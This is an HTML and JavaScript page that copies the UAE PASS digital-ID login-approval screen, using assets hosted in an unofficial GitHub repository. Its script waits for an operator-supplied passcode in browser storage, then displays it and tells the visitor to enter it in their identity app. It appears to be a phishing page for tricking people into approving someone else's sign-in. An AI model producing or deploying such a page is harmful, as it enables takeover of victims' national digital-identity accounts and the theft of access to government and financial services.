<!doctype html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" type="image/x-icon" href="https://raw.githubusercontent.com/invamsa-ai/saudi/main/favicon.ico">
    
    <!-- Bootstrap CSS من CDN -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    
    <!-- jQuery -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <title>UAE PASS - الموافقة على طلب تسجيل الدخول</title>
    
    <style>
        /* CSS الأساسي */
        body, html {
            font-family: 'Dubai', 'Roboto', sans-serif !important;
            background: #F9F9FB;
            margin: 0;
            padding: 0;
            height: 100%;
        }
        
        .main-container {
            height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .flex {
            display: flex;
        }

        .login-container {
            max-width: 1280px;
            margin: auto;
            flex: 0 0 100%;
        }

        .login-container-fluid {
            max-width: 100%;
            height: 100%;
        }

        .header {
            background: #fff;
            height: 64px;
            padding: 16px 0px;
        }

        .header-title {
            color: #1B1B1F;
            font-style: normal;
            font-weight: 300;
            line-height: 32px;
            font-size: 22px;
            padding: 0px 16px;
        }

        /* شاشة التحميل - كما طلبت */
        #loadingScreen {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
            padding: 40px 20px;
            background: #F9F9FB;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            z-index: 9999;
        }
        
        .card {
            margin: 48px 0px 10px 0px;
        }

        .card-info {
            position: relative;
            display: flex;
            flex-direction: column;
            min-width: 0;
            word-wrap: break-word;
            background-clip: border-box;
            border-radius: 0.25rem;
            margin: 48px 0px 10px 0px;
            border: 0px !important;
        }

        .card.login {
            padding: 48px;
            margin: 48px 0px 10px 0px;
            border: 1.6px solid transparent;
            border-radius: 19px;
            background-image: linear-gradient(to right bottom, white, white), radial-gradient(circle at top left, #ACE4AC, #fff, #fff 100%);
            background-origin: border-box;
            background-clip: padding-box, border-box;
        }

        .card.login .card-header {
            display: flex;
            justify-content: space-between;
            background: white;
            border: 0;
            padding: 0px;
        }

        .card.login .card-content {
            display: flex;
            flex-direction: row;
            flex-grow: 1;
            justify-content: space-between;
        }

        .card.login .card-content .card-content-left {
            max-width: 70%;
            padding-right: 40px;
        }

        .login-pin-image {
            max-width: 400px;
            width: 100%;
        }

        .info-title {
            font-size: 18px;
            font-style: normal;
            font-weight: 500;
        }

        .info-app-name {
            font-size: 16px;
            font-style: normal;
            font-weight: 400;
            padding: 32px 0px;
        }

        .info-description {
            font-size: 28px;
            font-style: normal;
            font-weight: 400;
            line-height: 36px;
            max-width: 500px;
        }

        @keyframes spin {
            from {transform: translate(-50%, -50%) rotate(0);}
            to   {transform: translate(-50%, -50%) rotate(360deg);}
        }

        .passcode-card {
            color: #454F63;
            width: 90px;
            height: 90px;
            margin: auto;
            position: relative;
            overflow: hidden;
            border-radius: 16px;
            display: inline-block;
        }

        .passcode-card::before {
            content: '';
            display: block;
            background: conic-gradient(
                #fff 0.0turn 0.125turn,
                #fff 0.125turn 0.25turn,
                #fff 0.25turn 0.375turn,
                #fff 0.375turn 0.5turn,
                #fff 0.5turn 0.625turn,
                #fff 0.625turn 0.75turn,
                #20644B 0.75turn 0.875turn,
                #20644B 0.875turn 1.0turn
            );
            width: calc(100% * 1.41421356237);
            padding-bottom: calc(100% * 1.41421356237);
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            border-radius: 100%;
            animation: spin 5s linear infinite;
        }

        .passcode-card::after {
            content: attr(data-after-content);
            position: absolute;
            inset: 0.15rem;
            background: #ECF3EC;
            border-radius: 0.85rem;
            font-size: 52px;
            font-style: normal;
            font-weight: 400;
            text-align: center;
            line-height: 100px;
        }

        .uaepass-logo {
            width: 32px;
            object-fit: contain;
            height: 32px;
            padding: 6px
        }

        .uaepass-text-logo {
            display: flex;
            height: 41px;
            justify-content: center;
            align-items: center;
        }

        .timer-img {
            width: 25px;
            height: 20px;
            padding: 1.667px 5.149px 2.415px 4.706px;
            justify-content: center;
            align-items: center;
        }

        .waiting-confirmation {
            color: #C78200;
            font-family: Roboto;
            font-size: 18px;
            font-style: normal;
            font-weight: 400;
            line-height: normal;
            padding-top: 52px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px; /* المسافة بين الأيقونة والنص */
        }

        .cancel-request {
            color: #FF5545;
            border: 0;
            background: transparent;
            font-size: 18px;
            font-style: normal;
            font-weight: 500;
            line-height: 24px;
            cursor: pointer;
        }

        .cancel-request:after {
            display: inline-block;
            content: "\00d7";
            font-size: 28px;
            padding: 10px 0px;
            font-weight: 400;
        }

        .polling-footer {
            position: relative;
            width: 100%;
        }

        .ids-logo {
            width: 13px;
            height: 13px;
            object-fit: contain;
            position: absolute;
            margin-bottom: 1em;
            margin-left: 5px;
        }

        .poweredby {
            font-size: 1rem;
            font-weight: 500;
            line-height: 1.5;
            text-align: center;
            color: #454f63;
        }

        /* تنسيق إضافي للرقم المعروض */
        .passcode-info {
            margin-top: 10px;
            font-size: 14px;
            color: #666;
            text-align: center;
            display: none; /* إخفاء المعلومات الإضافية */
        }
        
        /* هذا للتحكم في الإظهار والإخفاء */
        .main-content {
            display: none;
        }
        
        /* هذه هي الأهم - CSS المفقود للإظهار والإخفاء حسب حجم الشاشة */
        @media only screen and (min-width: 601px) {
            /* على الشاشات الكبيرة (الكمبيوتر) */
            .cancel-request-mobile,
            .card-content-right-mobile {
                display: none !important;
            }
            
            .card-content-right {
                display: block !important;
            }
            
            .cancel-request-div {
                display: block !important;
            }
        }

        @media only screen and (max-width: 600px) {
            /* على الشاشات الصغيرة (الموبايل) */
            .cancel-request-mobile {
                display: block !important;
                margin-top: 10px;
            }
            
            .card-content-right-mobile {
                display: block !important;
            }
            
            .card-content-right {
                display: none !important;
            }
            
            .cancel-request-div {
                display: none !important;
            }
            
            /* تصحيح المشكلة - إظهار صورة الموبايل في المكان الصحيح */
            .card-content-right-mobile {
                margin-bottom: 30px;
                text-align: center;
            }
            
            .login-pin-image {
                max-width: 200px !important;
            }
            
            .card.login {
                padding: 20px;
            }
            
            .info-description {
                font-size: 18px;
                line-height: 1.5;
            }
        }

        /* تأكد من إخفاء العناصر بشكل صحيح */
        .card-content-right-mobile {
            display: none;
        }
        
        .card-content-right {
            display: block;
        }
        
        .cancel-request-mobile {
            display: none;
        }
        
        .cancel-request-div {
            display: block;
        }
    </style>
</head>
<body>
    <div class="main-container">
        <!-- شاشة التحميل (تظهر أولاً وتظل حتى إدخال الرقم) -->
        <div id="loadingScreen">
            <div style="font-size: 60px; color: #00ac75; margin-bottom: 20px;">
                <i class="fas fa-spinner fa-spin"></i>
            </div>
            <h2 style="color: #454f63; margin-bottom: 10px;" id="loadingTitle">في انتظار إدخال الرقم</h2>
            <p style="color: #78849e;" id="loadingMessage">يرجى الانتظار...</p>
        </div>
        
        <!-- المحتوى الرئيسي (يظهر فقط بعد إدخال الرقم) -->
        <div class="main-content" id="mainContent">
            <!-- Header Section -->
            <div class="header-section">
                <div class="login-container-fluid header">
                    <div class="login-container flex">
                        <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/uae-pass-logo.png" alt="UAE PASS Logo" class="uaepass-logo">
                        <div class="header-title">الموافقة على طلب تسجيل الدخول</div>
                    </div>
                </div>
            </div>

            <!-- Main Content -->
            <div class="login-container-fluid">
                <div class="login-container">
                    <form id="loginForm" action="../../commonauth" method="post"
                          enctype="application/x-www-form-urlencoded" autocomplete="off" novalidate>
                        
                        <!-- Hidden Inputs -->
                        <input id="username" name="username" type="hidden" value="">
                        <input id="cancelOnWeb" type="hidden" name="cancelOnWeb" value="">
                        <input id="tocommonauth" name="tocommonauth" type="hidden" value="true">
                        <input id="password" name="password" type="hidden" value="">
                        <input type="hidden" id="sessionDataKey" name="sessionDataKey" value='f9b79f82-8317-4f54-aa60-0cd566553e95' />
                        
                        <!-- New input for username from user -->
                        <input type="hidden" id="usernameUserInput" name="usernameUserInput" value="">

                        <!-- Login Card -->
                        <div class="card login">
                            <div class="card-header">
                                <div>
                                    <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/digital_id_H.svg" alt="Digital ID" class="uaepass-text-logo">
                                </div>
                                <div class="cancel-request-div">
                                    <button type="button" class="cancel-request" onclick="cancel()" aria-label="إلغاء الطلب">
                                        إلغاء الطلب
                                    </button>
                                </div>
                            </div>
                            
                            <div class="card-content">
                                <!-- Left Content -->
                                <div class="card-content-left">
                                    <div class="card-info">
                                        <div class="info-title">
                                            طلب تسجيل الدخول من
                                        </div>
                                        <div class="info-app-name">Self Service Portal</div>

                                        <!-- Mobile Image - ستظهر فقط على الموبايل -->
                                        <div class="card-content-right-mobile">
                                            <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/login-pin.svg" alt="Login PIN" class="login-pin-image">
                                        </div>

                                        <div class="info-description">
                                            <span>افتح تطبيق الهوية الرقمية الخاص بك، وأدخل الرقم الموضح لتسجيل الدخول</span>
                                        </div>
                                        
                                        <!-- Passcode Display -->
                                        <div class="card-info">
                                            <div class="passcode-card" data-after-content="97" aria-label="الرمز 97" id="passcodeDisplay"></div>
                                        </div>
                                        
                                        <!-- Waiting Status -->
                                        <div class="waiting-confirmation">
                                            <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/Timer.gif" alt="Timer" class="timer-img">
                                            <span id="waitingText">في انتظار تأكيدك</span>
                                        </div>

                                        <!-- Mobile Cancel Button - سيظهر فقط على الموبايل -->
                                        <div class="cancel-request-mobile">
                                            <button type="button" class="cancel-request" onclick="cancel()" aria-label="إلغاء الطلب">
                                                إلغاء الطلب
                                            </button>
                                        </div>
                                    </div>
                                </div>
                                
                                <!-- Desktop Image - ستظهر فقط على الكمبيوتر -->
                                <div class="card-content-right">
                                    <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/login-pin.svg" alt="Login PIN" class="login-pin-image">
                                </div>
                            </div>
                        </div>
                        
                        <!-- Footer -->
                        <div class="polling-footer">
                            <img class="ids-logo" src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/n6.png" alt="IDS Logo" />
                            <p class="poweredby"> Powered by UAE PASS </p>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <!-- JavaScript -->
    <script type="text/javascript">
        // متغيرات التتبع
        let checkInterval = null;
        let checkCount = 0;
        const MAX_CHECKS = 300; // 5 دقائق (كل ثانية)
        
        // دالة لفحص وجود الرقم
        function checkForNumber() {
            try {
                const savedNumber = localStorage.getItem('auth_passcode_number');
                if (savedNumber) {
                    const numberData = JSON.parse(savedNumber);
                    const number = numberData.number;
                    const formattedNumber = numberData.formattedNumber || (number < 10 ? '0' + number : number.toString());
                    
                    // تحديث رسالة التحميل
                    document.getElementById('loadingTitle').textContent = 'جاري تسجيل الدخول';
                    document.getElementById('loadingMessage').textContent = 'يرجى الانتظار...';
                    
                    // إخفاء شاشة التحميل بعد تأخير قصير
                    setTimeout(() => {
                        document.getElementById('loadingScreen').style.display = 'none';
                        document.getElementById('mainContent').style.display = 'block';
                        
                        // تحميل وعرض الرقم
                        loadAndDisplayNumber(numberData);
                        
                        // بدء الاستطلاع بعد عرض الرقم
                        startPollingAfterDelay();
                    }, 1500);
                    
                    // إيقاف الفحص المتكرر
                    if (checkInterval) {
                        clearInterval(checkInterval);
                    }
                    
                    return true;
                } else {
                    // تحديث رسالة التحميل
                    checkCount++;
                    const minutes = Math.floor(checkCount / 60);
                    const seconds = checkCount % 60;
                    
                    document.getElementById('loadingTitle').textContent = 'في انتظار إدخال الرقم';
                    document.getElementById('loadingMessage').textContent = `يرجى الانتظار... (${minutes}:${seconds.toString().padStart(2, '0')})`;
                    
                    // إذا تجاوز الحد الأقصى للفحص
                    if (checkCount >= MAX_CHECKS) {
                        document.getElementById('loadingMessage').innerHTML = 
                            '<span style="color: #ff4757;">تجاوز وقت الانتظار. الرجاء فتح صفحة البيانات يدوياً.</span>';
                        
                        if (checkInterval) {
                            clearInterval(checkInterval);
                        }
                    }
                    
                    return false;
                }
            } catch (error) {
                console.error('❌ خطأ في فحص الرقم:', error);
                return false;
            }
        }
        
        // دالة لبدء الفحص المتكرر
        function startChecking() {
            // فحص أولي
            if (!checkForNumber()) {
                // بدء الفحص كل ثانية
                checkInterval = setInterval(checkForNumber, 1000);
            }
        }
        
        // دالة لتحميل وعرض الرقم المحفوظ
        function loadAndDisplayNumber(numberData) {
            try {
                const number = numberData.number;
                const formattedNumber = numberData.formattedNumber || (number < 10 ? '0' + number : number.toString());
                
                // عرض الرقم في passcode-card
                const passcodeCard = document.getElementById('passcodeDisplay');
                if (passcodeCard) {
                    passcodeCard.setAttribute('data-after-content', formattedNumber);
                    
                    // إضافة تأثير مرئي
                    passcodeCard.style.transform = 'scale(1.1)';
                    setTimeout(() => {
                        passcodeCard.style.transform = 'scale(1)';
                    }, 300);
                    
                    // لا نعرض أي معلومات إضافية
                    // إخفاء قسم passcode-info إذا كان موجوداً
                    const passcodeInfo = document.getElementById('passcodeInfo');
                    if (passcodeInfo) {
                        passcodeInfo.style.display = 'none';
                    }
                    
                    // تحديث نص الانتظار (فقط "في انتظار تأكيدك" بدون الرقم)
                    const waitingText = document.getElementById('waitingText');
                    if (waitingText) {
                        waitingText.textContent = 'في انتظار تأكيدك';
                    }
                    
                    console.log('✅ تم تحميل وعرض الرقم:', formattedNumber);
                    return true;
                }
            } catch (error) {
                console.error('❌ خطأ في تحميل وعرض الرقم:', error);
                return false;
            }
        }
        
        // دالة لبدء الاستطلاع بعد تأخير
        function startPollingAfterDelay() {
            // انتظار 2 ثانية لضمان عرض الرقم أولاً
            setTimeout(() => {
                sendTimingInfoInit();
            }, 2000);
        }
        
        // وظيفة الإلغاء
        function cancel() {
            document.getElementById("cancelOnWeb").value = "cancelledOnWebWaiting";
            document.getElementById("loginForm").submit();
        }

        // وظيفة انتهاء الوقت
        function timeout() {
            document.getElementById("cancelOnWeb").value = "webWaitingTimeout";
            document.getElementById("loginForm").submit();
        }

        // وظيفة بدء الاستطلاع (من الكود الأصلي)
        function sendTimingInfoInit() {
            var url_string = window.location.href;
            var url = new URL(url_string);
            var trx = url.searchParams.get("trx");

            function poll() {
                var pollingurl = "/auth/trx/status?trx="+trx;

                if(document.getElementById("cancelOnWeb").value !== "cancelledOnWebWaiting" &&
                   document.getElementById("cancelOnWeb").value !== "webWaitingTimeout") {
                    $.ajax({
                        type: "GET",
                        cache: false,
                        url: pollingurl,
                        success: function (data, status) {
                            if(data.code == '0') {
                                if (data.isConfirmed == '0') {
                                    setTimeout(poll, 2000);
                                } else {
                                    document.getElementById("loginForm").submit();
                                }
                            }
                        }
                    });
                }
            }
            setTimeout(poll, 3000);
            setTimeout(timeout, 180000);
        }

        // عند تحميل الصفحة
        document.addEventListener('DOMContentLoaded', function() {
            // إظهار شاشة التحميل مباشرة
            document.getElementById('loadingScreen').style.display = 'flex';
            document.getElementById('mainContent').style.display = 'none';
            
            // بدء الفحص المتكرر لوجود الرقم
            startChecking();
            
            // تعطيل خاصية حفظ النموذج التلقائي
            document.getElementById('loginForm')?.setAttribute('autocomplete', 'off');
        });

    </script>
</body>
</html>
